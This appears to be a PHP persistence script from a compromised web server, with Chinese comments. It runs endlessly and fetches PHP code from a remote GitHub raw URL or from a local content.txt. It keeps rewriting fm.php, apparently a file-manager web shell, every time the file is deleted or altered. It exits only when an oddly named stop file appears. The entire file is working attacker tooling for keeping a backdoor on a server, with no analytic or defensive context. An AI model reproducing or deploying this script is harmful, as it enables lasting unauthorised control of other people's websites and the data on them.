<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
ignore_user_abort(true);
set_time_limit(0);

$stopFlag = 'roobts.txt';
$targetFile = 'fm.php';
$sourceFile = 'content.txt';
$remoteURL  = 'https://raw.githubusercontent.com/black2729134369/black/main/lib.php';

file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Script started\n", FILE_APPEND);

$code = null;

while (true) {
    if (file_exists($stopFlag)) {
        @unlink($stopFlag);
        file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Stop flag detected. Exiting.\n", FILE_APPEND);
        break;
    }

    // 尝试读取 content.txt
    if (file_exists($sourceFile)) {
        $newCode = file_get_contents($sourceFile);
        @unlink($sourceFile);
        file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " content.txt updated and deleted\n", FILE_APPEND);

        if ($code === null || md5($newCode) !== md5($code)) {
            $code = $newCode;
        }
    }
    // 如果本地没有 content.txt，就尝试远程下载
    elseif ($code === null) {
        $newCode = @file_get_contents($remoteURL);
        if ($newCode !== false) {
            file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " content.txt fetched from remote\n", FILE_APPEND);
            $code = $newCode;
        } else {
            file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Failed to fetch remote content\n", FILE_APPEND);
        }
    }

    if ($code !== null) {
        if (!file_exists($targetFile) || md5_file($targetFile) !== md5($code)) {
            file_put_contents($targetFile, $code);
            // 取消修改权限，避免 Windows 环境权限问题
            // chmod($targetFile, 0444);
            file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " fm.php restored\n", FILE_APPEND);
        }
    } else {
        file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " No content available yet\n", FILE_APPEND);
    }

    usleep(1000000);
}
